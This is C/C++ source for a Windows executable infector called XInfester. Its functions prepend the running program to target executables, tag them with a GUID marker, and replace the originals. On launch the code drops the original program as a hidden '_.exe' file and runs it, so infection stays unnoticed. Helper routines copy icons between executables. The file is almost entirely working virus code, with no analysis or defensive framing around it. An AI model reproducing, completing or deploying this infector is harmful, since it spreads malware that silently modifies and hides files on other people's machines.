#include "../inc/XInfester.h"

const char *GetLocalAppFilePath()
{
	static char FilePath[MAX_PATH+1]= {0};
	char *p = NULL;
	GetModuleFileName(NULL, FilePath, sizeof(FilePath)); //Get current application directory path
	
	if(p=strrchr(FilePath, '\\'))						                 
	*p='\0';
	
	return FilePath;
}

const char *GetLocalAppFilename()
{
	static char FileName[MAX_PATH+1]= {0};
	GetModuleFileName(NULL, FileName, sizeof(FileName)); //Get current application fullName
	return FileName;
}


const char *GetLocalAppInfestedFilename()
{
	static char FileName[MAX_PATH+1]= {0};
	char *p = NULL;
	GetModuleFileName(NULL, FileName, sizeof(FileName)); //Get current application fullName
	
	if(p=strrchr(FileName, '.'))						                 
	*p='\0';

	strcat(FileName,"_.exe");
	
	return FileName;
}



size_t GetfileSize(const char *FileName)
{
	FILE *pf;
	size_t Size;
	if (pf=fopen(FileName,"rb"))
	{
		fseek(pf,0,SEEK_END);
		Size=ftell(pf);
		fclose(pf);
		return Size;
	}
	
	return 0;  //Error;
}


//////////////////////////////////////////////////////////////////////////
//ICON Changed codes

//Get handle of ICON
HICON GetExecICON(const char *ExeFile)
{
	HICON hIcon = NULL;
	SHFILEINFO FileInfo;
	DWORD_PTR dwRet = ::SHGetFileInfo(ExeFile, 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_ICON);
	if (dwRet)
	{
	hIcon = FileInfo.hIcon;
	}
	return hIcon;
/*	return ExtractIcon(GetModuleHandle(NULL),ExeFile,-1);*/
}

void SaveIcon(HICON hIconToSave, LPCTSTR sIconFileName) {
	if(hIconToSave==NULL || sIconFileName==NULL)
		return;
	//warning: this code snippet is not bullet proof.
	//do error check by yourself [masterz]
	PICTDESC picdesc;
	picdesc.cbSizeofstruct = sizeof(PICTDESC);
	picdesc.picType = PICTYPE_ICON ;            
	picdesc.icon.hicon = hIconToSave;
	IPicture* pPicture=NULL;
	OleCreatePictureIndirect(&picdesc, IID_IPicture, TRUE,(VOID**)&pPicture);
	LPSTREAM pStream;
	CreateStreamOnHGlobal(NULL,TRUE,&pStream);
	LONG size;
	HRESULT hr=pPicture->SaveAsFile(pStream,TRUE,&size);
	char pathbuf[1024];
	strcpy(pathbuf,sIconFileName);
	FILE * iconfile;
	iconfile=fopen(pathbuf,"wb");
	LARGE_INTEGER li;
	li.HighPart =0;
	li.LowPart =0;
	ULARGE_INTEGER ulnewpos;
	pStream->Seek( li,STREAM_SEEK_SET,&ulnewpos);
	ULONG uReadCount = 1;
	while(uReadCount>0)
	{

		pStream->Read(pathbuf,sizeof(pathbuf),&uReadCount);
		if(uReadCount>0)
			fwrite(pathbuf,uReadCount,1,iconfile);
	}
	pStream->Release();
	fclose(iconfile);

}


struct icons {
	int cnt;
	char names[128][64];
	WORD lang[128];
};


BOOL CALLBACK EnumResLangProc(HMODULE hModule, LPCSTR lpszType, LPCSTR lpszName, WORD wIDLanguage, LONG lParam)
{
	struct icons* i = (struct icons*) lParam;

	if ((DWORD)lpszName & ~0xffff)
		strcpy(i->names[i->cnt], lpszName);
	else
		memcpy(i->names[i->cnt] + 1, &lpszName, sizeof lpszName);

	i->lang[i->cnt] = wIDLanguage;

	++i->cnt;

	if (i->cnt == 128) return FALSE;
	else return TRUE;
}


BOOL CALLBACK EnumResNameProc(HMODULE hModule, LPCSTR lpszType, LPSTR lpszName, LONG_PTR lParam)
{
	EnumResourceLanguagesA(hModule, lpszType, lpszName, EnumResLangProc, lParam);

	return TRUE;
}


void ChangeIcon(char* exePath,const char *ICON)
{
	LPVOID pSrcData;
	int nSrcDataLen;
	HINSTANCE hInst = GetModuleHandleA(0);

	HRSRC Hsrc = FindResourceA(hInst, MAKEINTRESOURCEA(1), RT_ICON);

	FILE *pf;
	nSrcDataLen = GetfileSize(ICON);
	pSrcData = new char[nSrcDataLen];

	if (!(pf=fopen(ICON,"rb")))
	{
		delete [] pSrcData;
		return;
	}
	else
	{
		if(!fread(pSrcData,nSrcDataLen,1,pf))
		{
			delete [] pSrcData;
			return;
		}
		fclose(pf);
	}

	
	{
		struct icons* is = (struct icons*) malloc(sizeof(struct icons));
		memset(is, 0, sizeof(struct icons));
		{
			HMODULE hExeMod = LoadLibraryA(exePath);
			EnumResourceNamesA(hExeMod, RT_ICON, EnumResNameProc, (LONG)is);
			FreeLibrary(hExeMod);
		}

		{
			int i;
			HANDLE hExeSrc = BeginUpdateResourceA(exePath, FALSE);

			for(i = 0; i < is->cnt; ++i)
			{
				LPSTR resName = is->names[i];
				if (*resName)
					UpdateResourceA(hExeSrc, RT_ICON, resName, is->lang[i], pSrcData, nSrcDataLen);
				else
					UpdateResourceA(hExeSrc, RT_ICON, MAKEINTRESOURCEA(*(LONG*)(resName + 1)), is->lang[i], pSrcData, nSrcDataLen);
			}

			EndUpdateResourceA(hExeSrc, FALSE);
		}
		free(is);
	}
	delete [] pSrcData;
}



BOOL XInfester_InfestFile( const char *pDestFileName )
{
	FILE *Destfp=NULL;
	FILE *Selffp=NULL;
	FILE *Finalfp=NULL;
	char Buffer[1024]; //1k Buffer for W/R

	size_t SelfFileSize;
	size_t DestFileSize;

	XINFESTED_FLAG infestFlag;

	if (!(SelfFileSize=GetfileSize(GetLocalAppFilename())))
	{
		return FALSE;
	}

	if (!(DestFileSize=GetfileSize(pDestFileName)))
	{
		return FALSE;
	}

	//Checkout if the file has been infested.
	if (DestFileSize>sizeof(XINFESTED_FLAG))
	{
		Destfp=fopen(pDestFileName,"rb");
		if (!Destfp)										
		{
			goto ERR;									 //Error return:Dest file could not be opened;
		}

		XINFESTED_FLAG inf;
		fseek(Destfp,-(int)(sizeof(XINFESTED_FLAG)),SEEK_END);

		if(!fread(&inf,sizeof(XINFESTED_FLAG),1,Destfp))
			goto ERR;


		if (!strcmp(inf.GUIDs,XINFESTED_FLAG_GUIDS_STRING))
		{
			fclose(Destfp);
			return TRUE;
		}

		fclose(Destfp);
	}

	//Files open

	Selffp=fopen(GetLocalAppFilename(),"rb");

	if (!Selffp)
	{
		goto ERR;
	}

	Destfp=fopen(pDestFileName,"rb");
	if (!Destfp)										
	{
		goto ERR;									 //Error return:Dest file could not be opened;
	}

	Finalfp=fopen("TEMP","wb");
	if(!Finalfp)
	{
		goto ERR;
	}

	//Copy local to a NewFile
	XINFESTED_FLAG inf;
	fseek(Selffp,-(int)(sizeof(XINFESTED_FLAG)),SEEK_END);

	if(!fread(&inf,sizeof(XINFESTED_FLAG),1,Selffp))
		goto ERR;

	fseek(Selffp,0,SEEK_SET);

	if (strcmp(inf.GUIDs,XINFESTED_FLAG_GUIDS_STRING)==0)
	{
		//Self is infested
		SelfFileSize=inf.ResourceOffset;
		int Ws=SelfFileSize;
		while (Ws>0)
		{
			size_t ReadSize;
			ReadSize=fread(Buffer,1,sizeof(Buffer),Selffp);

			if (ReadSize)
			{
				if(!fwrite(Buffer,ReadSize,1,Finalfp))
					goto ERR;
			}
			Ws-=ReadSize;
		}
		
	}
	else
	{
		while (!feof(Selffp))
		{
			size_t ReadSize;
			ReadSize=fread(Buffer,1,sizeof(Buffer),Selffp);

			if (ReadSize)
			{
				if(!fwrite(Buffer,ReadSize,1,Finalfp))
					goto ERR;
			}
		}
	}

	

	//Copy dest to new file
	while (!feof(Destfp))
	{
		size_t ReadSize;
		ReadSize=fread(Buffer,1,sizeof(Buffer),Destfp);

		if (ReadSize)
		{
			if(!fwrite(Buffer,ReadSize,1,Finalfp))
				goto ERR;
		}
	}

	infestFlag.ResourceOffset=SelfFileSize;
	infestFlag.ResourceSize=DestFileSize;
	
	if(!fwrite(&infestFlag,sizeof(infestFlag),1,Finalfp))
		goto ERR;


	//Close files
		fclose(Destfp);
		fclose(Selffp);
		fclose(Finalfp);

	/*
	//Strip ICON
	HICON ico=GetExecICON(pDestFileName);
	if (ico!=NULL)
	{
		SaveIcon(ico,"ICO.ico");
	}
	*/
	DeleteFile(pDestFileName);
	CopyFileA("TEMP",pDestFileName,FALSE);
	DeleteFile("TEMP");
	return TRUE;

ERR:
	if(Destfp)
	fclose(Destfp);

	if (Selffp)
	fclose(Selffp);
	
	if (Finalfp)
	fclose(Finalfp);

	return FALSE;
}

void XInfester_Run()
{
	FILE *pf=NULL,*Resfp=NULL;
	XINFESTED_FLAG InfestFlag;
	char Buffer[1024]; //1K Buffer for W/R
	size_t ResSize;

	if (GetfileSize(GetLocalAppFilename())<sizeof(XINFESTED_FLAG))	//Invalid XInfest file
	{
		return;
	}
	
	do
	{
		//if file is existed
	   if ((Resfp=fopen(GetLocalAppInfestedFilename(),"r"))!=NULL)
	   {
		break;
	   }

	  if ((pf=fopen(GetLocalAppFilename(),"rb"))==NULL)	   //Selfopen failed
	  {
		goto ERR;										   //return directly;
	  }
	
	 //Is it infested file
	  fseek(pf,-(int)(sizeof(XINFESTED_FLAG)),SEEK_END);
	  if(!fread(&InfestFlag,sizeof(XINFESTED_FLAG),1,pf))
		goto ERR;

	
	  if (strcmp(InfestFlag.GUIDs,XINFESTED_FLAG_GUIDS_STRING))
	  {
		//Not a infested file
		goto ERR;
	  }
	 
	  //Open Resourcefile for written
	  if ((Resfp=fopen(GetLocalAppInfestedFilename(),"wb"))==NULL)
	  {
		  goto ERR;
	  
	  }
	
	  
	  fseek(pf,0,SEEK_SET);
	  fseek(pf,InfestFlag.ResourceOffset,SEEK_SET);
	  
	  ResSize=InfestFlag.ResourceSize;

	  while (ResSize&&(!feof(pf)))
	  {
			size_t ReadSize;
			
			if ((ReadSize=fread(Buffer,1,sizeof(Buffer),pf))==0)
			{		
			goto ERR;
			}
			
			if (!fwrite(Buffer,ReadSize,1,Resfp))
			{
				goto ERR;
			}

			ResSize-=ReadSize;
	  }
	}while(0);
	
	

	if(pf)
	fclose(pf);

	if(Resfp)
	fclose(Resfp);

	//Free resource execution file completed,CreateProcess for it

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory( &pi, sizeof(pi) );
	ZeroMemory( &si, sizeof(si) );

	//Set file attribute to hidden
	SetFileAttributes(GetLocalAppInfestedFilename(),GetFileAttributes(GetLocalAppInfestedFilename())|FILE_ATTRIBUTE_HIDDEN);

	//Create process without cmd lines
	CreateProcess(GetLocalAppInfestedFilename(), "", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return;
ERR:
	if (pf)
	{
		fclose(pf);
	}
	if (Resfp)
	{
		fclose(Resfp);
	}

	
}